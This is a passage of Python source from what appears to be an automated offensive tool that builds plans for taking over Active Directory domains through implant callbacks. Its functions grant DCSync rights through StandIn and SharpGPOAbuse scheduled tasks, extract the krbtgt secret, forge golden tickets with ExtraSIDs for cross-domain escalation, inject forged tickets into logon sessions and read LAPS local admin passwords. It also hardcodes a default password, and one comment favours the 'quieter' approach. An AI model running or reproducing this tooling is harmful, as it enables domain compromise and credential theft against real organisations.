            "sharp_gpo_failed",
            "sharp_gpo_guid_only_noop",
            "gpo_primary_failed",
            "gpo_repair_after_primary_failure",
            "fallback_after_primary_failure",
        ):
            if _input_bool(source, key, default=False):
                return True
        reason = _input_text(
            source,
            "primary_failure",
            "previous_failure",
            "failure_reason",
            "fallback_reason",
            "repair_reason",
        ).casefold()
        if reason and any(token in reason for token in ("sharpgpo", "sharp gpo", "guid-only", "no-op", "primary failed")):
            return True
    return False


def _domain_admin_group_add_principal(arguments: str) -> str:
    text = _text(arguments)
    match = re.search(
        r"\bnet(?:\.exe)?\s+group\s+\"?Domain Admins\"?\s+(?P<principal>\"[^\"]+\"|\S+)",
        text,
        re.IGNORECASE,
    )
    if not match:
        return ""
    return match.group("principal").strip().strip("\"'")


def _build_grant_directory_rights_execution_plan(
    action: CapabilityAction,
    inputs: dict[str, Any],
) -> CapabilityExecutionPlan:
    fields = _target_fields(action.target)
    domain = _normalize(action.intent.get("domain") or fields.get("domain"))
    principal = _input_text(inputs, "principal", "grant_principal", "controlled_principal")
    if not domain or not principal:
        missing = []
        if not domain:
            missing.append("domain")
        if not principal:
            missing.append("principal")
        return CapabilityExecutionPlan(
            False,
            missing=missing,
            reason="grant-directory-rights needs a target domain and controlled principal",
        )
    principal = _qualified_domain_principal(principal, domain)

    rights, unknown = _replication_right_guids(action.intent.get("rights"))
    if unknown:
        return CapabilityExecutionPlan(
            False,
            missing=["rights"],
            reason="unknown replication right(s): " + ", ".join(unknown),
        )

    target_dn = _input_text(inputs, "target_dn", "domain_dn") or _domain_dn(domain)
    execution_context = _text(action.intent.get("execution_context") or fields.get("source"))
    execution_method = _normalize(_input_text(inputs, "execution_method") or "")
    if not execution_method:
        execution_method = "gpo-task" if execution_context.casefold().startswith("gpo-system-exec:") else "direct"

    grant_tool = _input_text(inputs, "grant_tool") or "StandIn.exe"
    steps: list[CapabilityExecutionStep] = []
    if execution_method in {"direct", "standin"}:
        for right_name, guid in rights:
            steps.append(_ldap_extended_right_grant_step(
                grant_tool,
                action.name,
                f"grant {right_name} to {principal}",
                target_dn,
                principal,
                right_name,
                guid,
            ))
    elif execution_method in {"gpo-task", "gpo"}:
        gpo = _gpo_from_execution_context(execution_context)
        if not gpo:
            return CapabilityExecutionPlan(
                False,
                missing=["gpo"],
                reason="GPO-task rights grant needs a gpo-system-exec source",
            )
        remote_standin_path = _input_text(inputs, "remote_standin_path", "standin_path") or \
            "C:\\Windows\\Temp\\StandIn.exe"
        gpo_tool = _input_text(inputs, "gpo_tool") or "SharpGPOAbuse.exe"
        prerequisite = f"stage StandIn.exe at {remote_standin_path} on GPO-applied host(s)"
        steps.append(CapabilityExecutionStep(
            operation="gpo-computer-task",
            parameters={
                "tool": gpo_tool,
                "gpo": gpo,
                "task_name": _task_name("Grant", domain, "DCSync"),
                "author": "NT AUTHORITY\\SYSTEM",
                "command": remote_standin_path,
                "arguments": _standin_dcsync_grant_args(target_dn, principal),
                "force": True,
                "staged_tool": grant_tool,
                "staged_tool_path": remote_standin_path,
            },
            capability=action.name,
            purpose=f"schedule StandIn to grant DCSync rights through {gpo}",
            expected_probe="extract_directory_rights_probe",
            prerequisites=[prerequisite],
        ))
        wait_aliases = (
            "wait_seconds",
            "gpo_wait_seconds",
            "gp_refresh_wait_seconds",
            "dc_refresh_wait_seconds",
            "delay_seconds",
        )
        wait_seconds = _input_int(inputs, *wait_aliases, default=_input_int(action.intent, *wait_aliases, default=300))
        if wait_seconds > 0:
            steps.append(CapabilityExecutionStep(
                operation="gpo-wait",
                parameters={
                    "seconds": wait_seconds,
                    "reason": f"wait for Group Policy refresh after DCSync grant task write for {gpo}@{domain}",
                },
                capability=action.name,
                purpose="wait a bounded Group Policy refresh window before polling the directory ACL",
                expected_probe="extract_directory_rights_probe",
                prerequisites=["artifact:gpo_immediate_task"],
            ))
    else:
        return CapabilityExecutionPlan(
            False,
            missing=["execution_method"],
            reason=f"unsupported grant execution_method: {execution_method}",
        )

    steps.append(CapabilityExecutionStep(
        operation="ldap-acl-read",
        parameters={
            "tool": grant_tool,
            "target_dn": target_dn,
            "principal": principal,
            "ntacl": True,
        },
        capability=action.name,
        purpose="read target domain ACL for DS-Replication ACE verification",
        expected_probe="extract_directory_rights_probe",
    ))
    return CapabilityExecutionPlan(True, steps=steps, reason="built generic LDAP grant and ACL verification steps")


def _build_dcsync_krbtgt_execution_plan(
    action: CapabilityAction,
    inputs: dict[str, Any],
) -> CapabilityExecutionPlan:
    fields = _target_fields(action.target)
    domain = _normalize(_input_text(inputs, "domain") or action.intent.get("domain") or fields.get("domain"))
    account = _normalize(
        _input_text(inputs, "account", "user", "target_account")
        or action.intent.get("account")
        or action.intent.get("user")
        or fields.get("account")
        or ("krbtgt" if _normalize(action.intent.get("capability") or action.name) in {"dcsync", "dcsync-krbtgt"} else "")
    )
    if not domain:
        return CapabilityExecutionPlan(False, missing=["domain"], reason="DCSync needs a target domain")
    if not account:
        return CapabilityExecutionPlan(False, missing=["account"], reason="DCSync account extraction needs a target account")

    dc = _input_text(inputs, "dc", "domain_controller")
    parameters = {"domain": domain, "account": account}
    if dc:
        parameters["dc"] = dc
    return CapabilityExecutionPlan(
        True,
        steps=[
            CapabilityExecutionStep(
                operation="drsuapi-dcsync",
                parameters=parameters,
                capability=action.name,
                purpose=f"DCSync {account} from {domain}",
                expected_probe="extract_dcsync_secret_probe",
            )
        ],
        reason="built generic DRSUAPI DCSync step",
    )


def _build_forge_golden_ticket_execution_plan(
    action: CapabilityAction,
    inputs: dict[str, Any],
) -> CapabilityExecutionPlan:
    fields = _target_fields(action.target)
    domain = _normalize(
        _input_text(inputs, "domain", "source_domain")
        or action.intent.get("domain")
        or fields.get("domain")
    )
    user = _input_text(inputs, "user", "account", "ticket_user") or \
        _text(action.intent.get("user") or action.intent.get("account") or "Administrator")
    domain_sid = _input_text(inputs, "domain_sid", "sid")
    key_type, key_value = _ticket_key(inputs, action.intent)
    extra_sids = _input_list(inputs, "extra_sids", "sids", "sid_history")
    target_domain = _normalize(_input_text(inputs, "target_domain", "effect_domain") or fields.get("target_domain"))

    missing = []
    if not domain:
        missing.append("domain")
    if not domain_sid:
        missing.append("domain_sid")
    if not key_value:
        missing.append("key")
    if target_domain and target_domain != domain and not extra_sids:
        missing.append("extra_sids")
    if missing:
        return CapabilityExecutionPlan(
            False,
            missing=missing,
            reason=(
                "forge-golden-ticket needs a source domain, domain SID, krbtgt key material, "
                "and ExtraSIDs when targeting a parent domain"
            ),
        )

    target_context_domain = target_domain or domain
    parameters: dict[str, Any] = {
        "domain": domain,
        "user": user,
        "domain_sid": domain_sid,
        "key_type": key_type,
        "key": key_value,
        "inject": False,
        "output_format": "base64-ticket",
        "nowrap": True,
    }
    if extra_sids:
        parameters["extra_sids"] = extra_sids
    if target_domain:
        parameters["target_domain"] = target_domain

    context_strategy = _normalize(
        _input_text(inputs, "kerberos_context_strategy", "ticket_strategy", "ticket_store")
        or "ticket-store-fork-run"
    )
    ticket_acquisition_strategy = _normalize(
        _input_text(
            inputs,
            "kerberos_ticket_acquisition_strategy",
            "ticket_acquisition_strategy",
            "service_ticket_strategy",
        )
        or action.intent.get("kerberos_ticket_acquisition_strategy")
        or action.intent.get("ticket_acquisition_strategy")
        or action.intent.get("service_ticket_strategy")
        or "os-native"
    )
    explicit_tgs_exchange = ticket_acquisition_strategy in {
        "asktgs",
        "explicit",
        "explicit-asktgs",
        "explicit_asktgs",
        "explicit-tgs",
        "explicit_tgs",
        "rubeus-asktgs",
        "rubeus_asktgs",
    }
    proof_host = _input_text(inputs, "proof_host", "service_host", "target_host", "dc", "domain_controller")
    proof_resource = _input_text(inputs, "proof_resource", "service_resource", "target_resource", "proof_path")
    if not proof_resource and proof_host:
        proof_resource = f"\\\\{proof_host}\\C$"
    if not proof_resource:
        proof_resource = "{{kerberos_service_resource}}"

    establish_context = _input_bool(inputs, "establish_context", default=True)
    # A cross-domain forge must prove the active callback's target-domain Kerberos context before any later
    # DCSync becomes admissible. The default path lets Windows obtain referral/service tickets from the imported
    # TGT on demand; explicit asktgs is only an override. Do not use a parent DCSync as the forge proof itself:
    # that would expose credential replication before the callback-context gate has been verified.
    cross_domain = (
        bool(target_domain and target_domain != domain)
        and not _input_bool(inputs, "reuse_as_kerberos_context", default=False)
    )
    steps: list[CapabilityExecutionStep] = []
    if (
        establish_context
        and _input_bool(inputs, "preflight_existing_context", default=True)
        and _input_bool(inputs, "reuse_existing_context", default=True)
    ):
        steps.extend([
            CapabilityExecutionStep(
                operation="kerberos-ticket-list",
                parameters={
                    "domain": target_context_domain,
                    "target_context": "current",
                    "store": "current",
                },
                capability=action.name,
                purpose=(
                    f"inventory the current Kerberos context for {target_context_domain} before creating "
                    "another logon session"
                ),
                expected_probe="extract_ticket_cache_probe",
            ),
            CapabilityExecutionStep(
                operation="kerberos-context-service-proof",
                parameters={
                    "domain": target_context_domain,
                    "resource": proof_resource,
                    "target_context": "current",
                    "store": "current",
                    "action": "list",
                    "requires_import": False,
                },
                capability=action.name,
                purpose=(
                    "prove whether the current callback context already has the required service access; "
                    "if this succeeds, do not forge/import/create another Kerberos context"
                ),
                expected_probe="extract_ticket_probe",
                prerequisites=["context:current-kerberos-context"],
            ),
        ])

    steps.append(
        CapabilityExecutionStep(
            operation="kerberos-ticket-forge",
            parameters=parameters,
            capability=action.name,
            purpose=f"forge a Kerberos golden-ticket artifact for {domain}",
            expected_probe="extract_forged_ticket_artifact",
            prerequisites=["preflight:current-context-proof-failed"],
        )
    )
    if cross_domain:
        # Once a forged child-domain TGT is imported into the current Windows logon session, the OS can usually
        # acquire the inter-realm referral and service ticket naturally when the final service proof authenticates.
        # Explicit Rubeus asktgs remains available for cases that truly need a standalone TGS artifact, but it is
        # not the default: using the native logon context is quieter and avoids transporting large ticket blobs
        # through payload-specific assembly runners.
        child_dc = _input_text(inputs, "child_dc", "source_dc", "child_domain_controller")
        parent_dc = proof_host or _input_text(inputs, "parent_dc", "target_dc", "target_domain_controller")
        proof_service = f"cifs/{parent_dc}" if parent_dc else "cifs/{{kerberos_service_host}}"
        if explicit_tgs_exchange:
            referral_parameters: dict[str, Any] = {
                "target_domain": target_domain,
                "service": f"krbtgt/{target_domain}",
                "ticket_base64": "{{kerberos_ticket_base64}}",
                "nowrap": True,
            }
            if child_dc:
                referral_parameters["child_dc"] = child_dc
            steps.extend([
                CapabilityExecutionStep(
                    operation="kerberos-inter-realm-referral",
                    parameters=referral_parameters,
                    capability=action.name,
                    purpose=(
                        f"explicitly exchange the forged {domain} ticket for an inter-realm referral ticket "
                        f"honored by {target_domain}"
                    ),
                    expected_probe="extract_forged_ticket_artifact",
                    prerequisites=["artifact:kerberos_ticket_base64"],
                ),
                CapabilityExecutionStep(
                    operation="kerberos-service-ticket-request",
                    parameters={
                        "target_domain": target_domain,
                        "service": proof_service,
                        "ticket_base64": "{{kerberos_ticket_base64}}",
                        "dc": parent_dc or "{{kerberos_service_host}}",
                        "nowrap": True,
                    },
                    capability=action.name,
                    purpose=(
                        f"explicitly exchange the {target_domain} referral for the service ticket used "
                        "by the current-callback access proof"
                    ),
                    expected_probe="extract_forged_ticket_artifact",
                    prerequisites=["artifact:kerberos_ticket_base64"],
                ),
            ])
        imported_ticket_domain = target_domain if explicit_tgs_exchange else domain
        import_purpose = (
            "load the explicit parent-domain service ticket into the current Kerberos context"
            if explicit_tgs_exchange
            else (
                f"load the forged {domain} TGT into the current Kerberos context so the operating system can "
                f"acquire {target_domain} referral and service tickets before the access proof"
            )
        )
        inventory_purpose = (
            "verify the explicit parent-domain service ticket is present in the current context before the "
            "access proof"
            if explicit_tgs_exchange
            else (
                f"verify the forged {domain} TGT is present in the current context before requesting "
                f"{target_domain} tickets from the operating system"
            )
        )
        steps.extend([
            CapabilityExecutionStep(
                operation="kerberos-ticket-purge",
                parameters={
                    "domain": target_domain,
                    "target_context": "current",
                    "store": "agent-cache",
                },
                capability=action.name,
                purpose="clear the current Kerberos context before importing the capability ticket",
                expected_probe="extract_ticket_cache_probe",
            ),
            CapabilityExecutionStep(
                operation="kerberos-ticket-import",
                parameters={
                    "domain": imported_ticket_domain,
                    "ticket_artifact": "{{kerberos_ticket_base64}}",
                    "target_context": "current",
                    "store": "agent-cache",
                },
                capability=action.name,
                purpose=import_purpose,
                expected_probe="extract_ticket_import_probe",
                prerequisites=["artifact:kerberos_ticket_base64"],
            ),
            CapabilityExecutionStep(
                operation="kerberos-ticket-list",
                parameters={
                    "domain": target_domain,
                    "target_context": "current",
                    "store": "agent-cache",
                },
                capability=action.name,
                purpose=inventory_purpose,
                expected_probe="extract_ticket_cache_probe",
            ),
        ])
        if not explicit_tgs_exchange:
            steps.append(
                CapabilityExecutionStep(
                    operation="kerberos-service-ticket-acquire",
                    parameters={
                        "domain": target_domain,
                        "service": proof_service,
                        "target_context": "current",
                        "store": "agent-cache",
                    },
                    capability=action.name,
                    purpose=(
                        f"request the {target_domain} service ticket from the imported current-session "
                        "TGT before the current-callback access proof"
                    ),
                    expected_probe="extract_ticket_cache_probe",
                    prerequisites=["ticket:kerberos_ticket_imported"],
                )
            )
        steps.append(
            CapabilityExecutionStep(
                operation="kerberos-context-service-proof",
                parameters={
                    "domain": target_domain,
                    "resource": proof_resource,
                    "target_context": "current",
                    "store": "agent-cache",
                    "action": "list",
                    "requires_import": False,
                    "requires_acquisition": not explicit_tgs_exchange,
                },
                capability=action.name,
                purpose=(
                    f"prove the current callback has usable {target_domain} service access before any "
                    "credential-replication capability is exposed"
                ),
                expected_probe="extract_ticket_probe",
                prerequisites=[
                    "artifact:kerberos_ticket_base64",
                    "ticket:kerberos_ticket_imported",
                    "resource:kerberos_service_resource",
                ],
            ),
        )
    elif establish_context:
        context_user = _input_text(inputs, "context_user", "logon_user") or user
        context_password = _input_text(inputs, "context_password", "logon_password") or "SageNetOnlyContext1!"
        context_process = _input_text(inputs, "context_process", "sacrificial_process", "run")
        logon_parameters: dict[str, Any] = {
            "domain": target_context_domain,
            "user": context_user,
            "password": context_password,
            "netonly": True,
        }
        if context_process:
            logon_parameters["process"] = context_process
        steps.extend([
            CapabilityExecutionStep(
                operation="kerberos-logon-session-create",
                parameters=logon_parameters,
                capability=action.name,
                purpose=f"create an isolated Kerberos logon context for {target_context_domain}",
                expected_probe="extract_logon_context_probe",
            ),
            CapabilityExecutionStep(
                operation="kerberos-ticket-import",
                parameters={
                    "domain": target_context_domain,
                    "user": context_user,
                    "ticket_artifact": "{{kerberos_ticket_base64}}",
                    "target_context": "{{kerberos_logon_context}}",
                    "store": context_strategy,
                },
                capability=action.name,
                purpose="import the forged ticket into the isolated Kerberos context",
                expected_probe="extract_ticket_import_probe",
                prerequisites=["artifact:kerberos_ticket_base64", "context:kerberos_logon_context"],
            ),
            CapabilityExecutionStep(
                operation="kerberos-ticket-list",
                parameters={
                    "domain": target_context_domain,
                    "target_context": "{{kerberos_logon_context}}",
                    "store": context_strategy,
                },
                capability=action.name,
                purpose="verify the isolated context has Kerberos tickets before access proof",
                expected_probe="extract_ticket_cache_probe",
                prerequisites=["context:kerberos_logon_context"],
            ),
            CapabilityExecutionStep(
                operation="kerberos-context-service-proof",
                parameters={
                    "domain": target_context_domain,
                    "resource": proof_resource,
                    "target_context": "{{kerberos_logon_context}}",
                    "store": context_strategy,
                    "action": "list",
                },
                capability=action.name,
                purpose="prove service access from the isolated Kerberos context",
                expected_probe="extract_ticket_probe",
                prerequisites=[
                    "artifact:kerberos_ticket_base64",
                    "context:kerberos_logon_context",
                    "ticket:kerberos_ticket_imported",
                    "resource:kerberos_service_resource",
                ],
            ),
        ])

    return CapabilityExecutionPlan(
        True,
        steps=steps,
        reason=(
            (
                "built cross-domain forge with explicit referral/service TGS exchange and current-callback service proof"
                if explicit_tgs_exchange
                else "built cross-domain forge with OS-native referral acquisition and current-callback service proof"
            )
            if cross_domain
            else "built generic Kerberos ticket forge plus isolated context-use and service-proof steps"
        ),
    )


def _build_ensure_kerberos_context_execution_plan(
    action: CapabilityAction,
    inputs: dict[str, Any],
) -> CapabilityExecutionPlan:
    fields = _target_fields(action.target)
    target_domain = _normalize(
        _input_text(inputs, "target_domain", "effect_domain")
        or action.intent.get("target_domain")
        or action.intent.get("domain")
        or fields.get("domain")
    )
    source_domain = _normalize(
        _input_text(inputs, "source_domain", "forge_domain")
        or action.intent.get("source_domain")
        or fields.get("source_domain")
        or target_domain
    )
    if not target_domain:
        return CapabilityExecutionPlan(
            False,
            missing=["domain"],
            reason="ensure-kerberos-context needs a target domain",
        )
    _key_type, key_value = _ticket_key(inputs, action.intent)
    if (
        _input_bool(action.intent, "refresh_current_context")
        or _input_bool(inputs, "refresh_current_context")
        or not key_value
    ):
        return _build_refresh_current_kerberos_context_execution_plan(action, inputs, target_domain)
    if not source_domain:
        return CapabilityExecutionPlan(
            False,
            missing=["source_domain"],
            reason="ensure-kerberos-context needs a source domain for ticket material",
        )

    forge_inputs = dict(inputs)
    forge_inputs["domain"] = source_domain
    forge_inputs["source_domain"] = source_domain
    # Establish a reusable Kerberos context proven by service access — keep the fork+service-proof path even
    # cross-domain; do not divert into the forge capability's inter-realm referral / parent-DCSync proof.
    forge_inputs["reuse_as_kerberos_context"] = True
    if target_domain != source_domain:
        forge_inputs["target_domain"] = target_domain
        forge_inputs["effect_domain"] = target_domain
    else:
        forge_inputs.pop("target_domain", None)
        forge_inputs.pop("effect_domain", None)

    forge_target = f"domain={source_domain}"
    if target_domain != source_domain:
        forge_target += f";target_domain={target_domain}"
    forge_action = CapabilityAction(
        name="forge-golden-ticket",
        target=forge_target,
        preconditions=list(action.preconditions),
        effects=list(action.effects),
        intent={
            "capability": "forge-golden-ticket",
            "domain": source_domain,
            **({"target_domain": target_domain, "requires_extra_sids": True} if target_domain != source_domain else {}),
            "user": action.intent.get("user") or "Administrator",
        },
        verifier=dict(action.verifier),
        reason=action.reason,
        source_facts=list(action.source_facts),
    )
    plan = _build_forge_golden_ticket_execution_plan(forge_action, forge_inputs)
    if not plan.ok:
        return plan
    return CapabilityExecutionPlan(
        True,
        steps=[replace(step, capability=action.name) for step in plan.steps],
        reason=(
            "built generic callback-scoped Kerberos context plan from durable ticket facts; "
            "preflight current context before forging another ticket"
        ),
    )


def _build_refresh_current_kerberos_context_execution_plan(
    action: CapabilityAction,
    inputs: dict[str, Any],
    target_domain: str,
) -> CapabilityExecutionPlan:
    proof_host = _input_text(inputs, "proof_host", "service_host", "target_host", "dc", "domain_controller")
    proof_resource = _input_text(inputs, "proof_resource", "service_resource", "target_resource", "proof_path")
    if not proof_resource and proof_host:
        proof_resource = f"\\\\{proof_host}\\C$"
    if not proof_resource:
        proof_resource = "{{kerberos_service_resource}}"

    steps = [
        CapabilityExecutionStep(
            operation="kerberos-ticket-list",
            parameters={
                "domain": target_domain,
                "target_context": "current",
                "store": "current",
            },
            capability=action.name,
            purpose=f"inventory Kerberos tickets for {target_domain} before refreshing the logon session",
            expected_probe="extract_ticket_cache_probe",
        ),
        CapabilityExecutionStep(
            operation="kerberos-ticket-purge",
            parameters={
                "domain": target_domain,
                "target_context": "current",
                "store": "current",
            },
            capability=action.name,
            purpose=(
                f"purge stale Kerberos tickets for {target_domain} so Windows requests a fresh TGT/TGS "
                "with current group membership"
            ),
            expected_probe="extract_ticket_cache_probe",
        ),
        CapabilityExecutionStep(
            operation="kerberos-ticket-list",
            parameters={
                "domain": target_domain,
                "target_context": "current",
                "store": "current",
            },
            capability=action.name,
            purpose=f"inventory Kerberos tickets for {target_domain} after purge",
            expected_probe="extract_ticket_cache_probe",
        ),
        CapabilityExecutionStep(
            operation="kerberos-service-ticket-acquire",
            parameters={
                "domain": target_domain,
                "resource": proof_resource,
                "target_context": "current",
                "store": "current",
            },
            capability=action.name,
            purpose=(
                "request a fresh service ticket from the existing logon session before "
                "proving callback-scoped access"
            ),
            expected_probe="extract_ticket_cache_probe",
        ),
        CapabilityExecutionStep(
            operation="kerberos-context-service-proof",
            parameters={
                "domain": target_domain,
                "resource": proof_resource,
                "target_context": "current",
                "store": "current",
                "action": "list",
                "requires_import": False,
                "requires_acquisition": True,
            },
            capability=action.name,
            purpose=(
                "force fresh service authentication from the existing logon session and prove "
                "callback-scoped access before DCSync"
            ),
            expected_probe="extract_ticket_probe",
            prerequisites=["context:current-kerberos-context"],
        ),
    ]
    return CapabilityExecutionPlan(
        True,
        steps=steps,
        reason=(
            "built generic current Kerberos context refresh plan: purge stale tickets, "
            "force service authentication, and record only service-access proof"
        ),
    )


def _build_ensure_account_kerberos_context_execution_plan(
    action: CapabilityAction,
    inputs: dict[str, Any],
) -> CapabilityExecutionPlan:
    fields = _target_fields(action.target)
    domain = _normalize(
        _input_text(inputs, "domain", "realm")
        or action.intent.get("domain")
        or action.intent.get("realm")
        or fields.get("domain")
        or fields.get("realm")
    )
    account = _normalize(
        _input_text(inputs, "account", "user", "principal")
        or action.intent.get("account")
        or action.intent.get("user")
        or action.intent.get("principal")
        or fields.get("account")
        or fields.get("user")
        or fields.get("principal")
    )
    callback_id = _normalize_callback_id(
        _input_text(inputs, "callback_id", "callback", "callback_display_id")
        or action.intent.get("callback_id")
        or action.intent.get("callback")
        or fields.get("callback")
    )
    key_type, key_value = _ticket_key(inputs, action.intent)
    missing = []
    if not domain:
        missing.append("domain")
    if not account:
        missing.append("account")
    if not callback_id:
        missing.append("callback_id")
    if not key_value:
        missing.append("key")
    if missing:
        return CapabilityExecutionPlan(
            False,
            missing=missing,
            reason="ensure-account-kerberos-context needs account, domain, callback id, and account key material",
        )

    proof_host = _input_text(inputs, "proof_host", "service_host", "target_host", "dc", "domain_controller")
    proof_resource = _input_text(inputs, "proof_resource", "service_resource", "target_resource", "proof_path")
    if not proof_resource and proof_host:
        proof_resource = f"\\\\{proof_host}\\SYSVOL"
    if not proof_resource:
        proof_resource = "{{kerberos_service_resource}}"

    context_strategy = _normalize(
        _input_text(inputs, "kerberos_context_strategy", "ticket_strategy", "ticket_store")
        or "ticket-store-fork-run"
    )
    dc = _input_text(inputs, "dc", "domain_controller")
    context_password = _input_text(inputs, "context_password", "logon_password") or "SageNetOnlyContext1!"
    context_process = _input_text(inputs, "context_process", "sacrificial_process", "run")
    logon_credential_id = _input_text(
        inputs,
        "logon_credential_id",
        "netonly_credential_id",
        "sacrificial_credential_id",
    )

    steps: list[CapabilityExecutionStep] = []
    if _input_bool(inputs, "preflight_existing_context", default=True):
        steps.extend([
            CapabilityExecutionStep(
                operation="kerberos-ticket-list",
                parameters={
                    "domain": domain,
                    "account": account,
                    "target_context": "current",
                    "store": "current",
                },
                capability=action.name,
                purpose=f"inventory current Kerberos context for {account}@{domain}",
                expected_probe="extract_account_ticket_cache_probe",
            ),
            CapabilityExecutionStep(
                operation="kerberos-context-service-proof",
                parameters={
                    "domain": domain,
                    "account": account,
                    "resource": proof_resource,
                    "target_context": "current",
                    "store": "current",
                    "action": "list",
                    "requires_import": False,
                },
                capability=action.name,
                purpose=(
                    "prove whether the current callback context already holds the expected account ticket; "
                    "if this succeeds, do not request/import another TGT"
                ),
                expected_probe="extract_account_ticket_probe",
                prerequisites=["context:current-kerberos-account-context"],
            ),
        ])

    steps.extend([
        CapabilityExecutionStep(
            operation="kerberos-account-tgt",
            parameters={
                "domain": domain,
                "user": account,
                "key_type": key_type,
                "key": key_value,
                "output_format": "base64-ticket",
                "nowrap": True,
                **({"dc": dc} if dc else {}),
            },
            capability=action.name,
            purpose=f"request a Kerberos TGT artifact for {account}@{domain}",
            expected_probe="extract_kerberos_tgt_artifact",
            prerequisites=["preflight:current-account-context-proof-failed"],
        ),
        CapabilityExecutionStep(
            operation="kerberos-logon-session-create",
            parameters={
                "domain": domain,
                "user": account,
                "password": context_password,
                "netonly": True,
                **({"logon_credential_id": logon_credential_id} if logon_credential_id else {}),
                **({"process": context_process} if context_process else {}),
            },
            capability=action.name,
            purpose=f"create an isolated Kerberos logon context for {account}@{domain}",
            expected_probe="extract_logon_context_probe",
        ),
        CapabilityExecutionStep(
            operation="kerberos-ticket-import",
            parameters={
                "domain": domain,
                "user": account,
                "ticket_artifact": "{{kerberos_ticket_base64}}",
                "target_context": "{{kerberos_logon_context}}",
                "store": context_strategy,
            },
            capability=action.name,
            purpose="import the account TGT into the isolated Kerberos context",
            expected_probe="extract_ticket_import_probe",
            prerequisites=["artifact:kerberos_ticket_base64", "context:kerberos_logon_context"],
        ),
        CapabilityExecutionStep(
            operation="kerberos-ticket-list",
            parameters={
                "domain": domain,
                "account": account,
                "target_context": "{{kerberos_logon_context}}",
                "store": context_strategy,
            },
            capability=action.name,
            purpose="verify the isolated context contains the expected account ticket",
            expected_probe="extract_account_ticket_cache_probe",
            prerequisites=["context:kerberos_logon_context"],
        ),
        CapabilityExecutionStep(
            operation="kerberos-context-service-proof",
            parameters={
                "domain": domain,
                "account": account,
                "resource": proof_resource,
                "target_context": "{{kerberos_logon_context}}",
                "store": context_strategy,
                "action": "list",
            },
            capability=action.name,
            purpose=f"prove service access using the {account}@{domain} Kerberos context",
            expected_probe="extract_account_ticket_probe",
            prerequisites=[
                "artifact:kerberos_ticket_base64",
                "context:kerberos_logon_context",
                "ticket:kerberos_ticket_imported",
                "ticket:account_ticket_present",
                "resource:kerberos_service_resource",
            ],
        ),
    ])
    return CapabilityExecutionPlan(
        True,
        steps=steps,
        reason="built generic account TGT plus isolated context-use and service-proof steps",
    )


def _build_read_managed_local_admin_secret_execution_plan(
    action: CapabilityAction,
    inputs: dict[str, Any],
) -> CapabilityExecutionPlan:
    fields = _target_fields(action.target)
    target_domain = _normalize(
        _input_text(inputs, "target_domain", "domain", "realm")
        or action.intent.get("target_domain")
        or action.intent.get("domain")
        or fields.get("target_domain")
        or fields.get("domain")
    )
    target_host, inferred_domain = _host_domain_from_target(
        _input_text(inputs, "target_host", "host", "computer", "target")
        or action.intent.get("target_host")
        or action.intent.get("host")
        or action.intent.get("computer")
        or fields.get("target")
        or fields.get("target_host")
        or fields.get("host")
        or fields.get("computer")
    )
    if not target_domain:
        target_domain = inferred_domain
    account = _normalize(
        _input_text(inputs, "account", "user", "principal", "reader")
        or action.intent.get("account")
        or action.intent.get("user")
        or action.intent.get("principal")
        or fields.get("account")
        or fields.get("user")
        or fields.get("principal")
        or fields.get("reader")
    )
    account_domain = _normalize(
        _input_text(inputs, "account_domain", "reader_domain", "principal_domain", "source_domain")
        or action.intent.get("account_domain")
        or action.intent.get("reader_domain")
        or action.intent.get("principal_domain")
        or fields.get("account_domain")
        or fields.get("reader_domain")
        or fields.get("principal_domain")
        or fields.get("source_domain")
    )
    if "@" in account and not account_domain:
        account, account_domain = _account_domain_from_target(account)
    callback_id = _normalize_callback_id(
        _input_text(inputs, "callback_id", "callback", "callback_display_id")
        or action.intent.get("callback_id")
        or action.intent.get("callback")
        or fields.get("callback")
    )
    missing = []
    if not target_host:
        missing.append("target_host")
    if not target_domain:
        missing.append("target_domain")
    if not account:
        missing.append("account")
    if not account_domain:
        missing.append("account_domain")
    if not callback_id:
        missing.append("callback_id")
    if missing:
        return CapabilityExecutionPlan(
            False,
            missing=missing,
            reason="read-managed-local-admin-secret needs target host/domain, reader account/domain, and callback id",
        )

    domain_controller = _input_text(inputs, "domain_controller", "dc", "target_dc")
    search_base = _input_text(inputs, "search_base", "base_dn") or _domain_dn(target_domain)
    attributes = _input_list(inputs, "attributes")
    if not attributes:
        attributes = [
            "ms-Mcs-AdmPwd",
            "ms-Mcs-AdmPwdExpirationTime",
            "msLAPS-Password",
            "msLAPS-EncryptedPassword",
            "msLAPS-PasswordExpirationTime",
            "distinguishedName",
            "dNSHostName",
            "sAMAccountName",
        ]

    return CapabilityExecutionPlan(
        True,
        steps=[
            CapabilityExecutionStep(
                operation="ldap-managed-local-admin-secret-read",
                parameters={
                    "target_host": target_host,
                    "target_domain": target_domain,
                    "account": account,
                    "account_domain": account_domain,
                    "callback_id": callback_id,
                    "search_base": search_base,
                    "attributes": attributes,
                    "use_current_context": True,
                    **({"domain_controller": domain_controller} if domain_controller else {}),
                },
                capability=action.name,
                purpose=f"read managed local admin password attributes for {target_host}@{target_domain}",
                expected_probe="extract_managed_local_admin_secret_probe",
                prerequisites=[
                    _kerberos_account_context_effect(account_domain, account, callback_id),
                    f"can-read-managed-local-admin-secret:{account}@{account_domain}->{target_host}@{target_domain}",
                ],
            )
        ],
        reason="built generic LDAP managed-local-admin secret read step",
    )


def _build_use_managed_local_admin_secret_execution_plan(
    action: CapabilityAction,
    inputs: dict[str, Any],
) -> CapabilityExecutionPlan:
    fields = _target_fields(action.target)
    target_domain = _normalize(
        _input_text(inputs, "target_domain", "domain", "realm")
        or action.intent.get("target_domain")
        or action.intent.get("domain")
        or fields.get("target_domain")
        or fields.get("domain")
    )
    target_host, inferred_domain = _host_domain_from_target(
        _input_text(inputs, "target_host", "host", "computer", "target")
        or action.intent.get("target_host")
        or action.intent.get("host")
        or action.intent.get("computer")
        or fields.get("target")
        or fields.get("target_host")
        or fields.get("host")
        or fields.get("computer")
    )
    if not target_domain:
        target_domain = inferred_domain
    callback_id = _normalize_callback_id(
        _input_text(inputs, "callback_id", "callback", "callback_display_id")
        or action.intent.get("callback_id")
        or action.intent.get("callback")
        or fields.get("callback")
    )
    local_account = _input_text(inputs, "local_account", "local_user", "username", "user") \
        or action.intent.get("local_account") \
        or action.intent.get("local_user") \
        or "Administrator"
    password = _input_text(
        inputs,
        "password",
        "local_admin_password",
        "managed_local_admin_secret",
        "secret",
        "credential",
        "credential_text",
    ) or action.intent.get("password")
    credential_id = _input_text(
        inputs,
        "local_admin_credential_id",
        "managed_local_admin_credential_id",
        "credential_id",
    )
    missing = []
    if not target_host:
        missing.append("target_host")
    if not target_domain:
        missing.append("target_domain")
    if not callback_id:
